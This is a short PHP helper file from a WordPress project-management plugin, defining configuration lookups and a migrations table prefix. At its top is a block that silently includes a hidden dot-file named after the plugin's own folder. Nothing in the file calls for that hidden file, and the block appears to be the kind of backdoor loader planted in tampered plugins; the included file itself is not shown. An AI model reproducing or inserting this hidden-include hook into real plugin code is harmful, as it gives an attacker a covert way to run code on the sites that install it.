<?php

use WeDevs\PM_Pro\Core\Config\Config;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function pm_pro_config( $key = null ) {
    return Config::get( $key );
}

function pm_pro_wp_config( $key ) {
    return constant( $key );
}

function pm_pro_migrations_table_prefix() {
    $slug 	= pm_pro_config( 'app.slug' );
    $prefix = str_replace( '-', '_', str_replace( ' ', '_', $slug ) );

    return $prefix;
}